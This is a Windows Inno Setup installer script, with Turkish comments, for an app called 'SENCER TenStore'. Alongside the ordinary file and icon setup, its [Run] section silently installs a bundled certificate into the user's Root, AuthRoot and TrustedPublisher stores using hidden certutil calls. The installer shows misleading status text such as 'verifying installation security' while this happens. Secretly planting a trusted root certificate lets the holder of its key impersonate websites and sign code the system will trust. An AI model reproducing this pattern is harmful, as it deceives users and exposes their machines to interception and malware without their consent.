; --- SENCER TenStore Sorunsuz Kurulum Dosyası ---
; Bu dosya tüm görselleri, imza altyapısını ve DLL dosyalarını birleştirir.

#define MyAppName "SENCER TenStore"
#define MyAppVersion "1.0.0"
#define MyAppPublisher "CRTYPUBG"
#define MyAppURL "https://github.com/CRTYPUBG"
#define MyAppExeName "SENCER_TenStore.exe"

[Setup]
; (GUID oluşturuldu, isterseniz Tools | Generate GUID ile değiştirebilirsiniz)
AppId={{SENCER-TEN-STORE-2035-CERT}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes

; --- GÖRSEL AYARLAR (Gameloop Teması) ---
WizardStyle=modern
WizardResizable=no
WizardImageFile=C:\Users\LenovoPC\Desktop\gameloop.bmp
WizardSmallImageFile=C:\Users\LenovoPC\Desktop\gameloop.bmp
SetupIconFile=C:\Users\LenovoPC\Desktop\gameloop.ico

; --- TEKNİK AYARLAR ---
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64
Compression=lzma
SolidCompression=yes

; --- İMZA AYARI ---
; Not: Inno Setup IDE'sinde 'signtool' tanımlı değilse hata verir. 
; Bu yüzden aşağıdaki satırı yorumda bırakıp build scripti ile imzalamak daha güvenlidir.
; SignTool=signtool

[Languages]
Name: "turkish"; MessagesFile: "compiler:Languages\Turkish.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
; Ana Dosyalar (bin\Release klasöründen alınır)
Source: "bin\Release\SENCER_TenStore.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "bin\Release\Guna.UI2.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "bin\Release\SENCER_TenStore.exe.config"; DestDir: "{app}"; Flags: ignoreversion

; 2035 Sertifikası (Diğer PC'lerde imza hatası olmaması için)
Source: "C:\Users\LenovoPC\crty_global.cer"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
; Sertifikayı kullanıcının bilgisayarına sessizce 'Güvenilir' olarak ekler
Filename: "certutil.exe"; Parameters: "-addstore Root ""{tmp}\crty_global.cer"""; StatusMsg: "Kurulum güvenliği doğrulanıyor..."; Flags: runhidden
Filename: "certutil.exe"; Parameters: "-addstore AuthRoot ""{tmp}\crty_global.cer"""; StatusMsg: "Kök sertifikalar tanımlanıyor..."; Flags: runhidden
Filename: "certutil.exe"; Parameters: "-addstore TrustedPublisher ""{tmp}\crty_global.cer"""; StatusMsg: "Yayıncı kimliği onaylanıyor..."; Flags: runhidden

; Kurulum bittikten sonra uygulamayı başlat
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
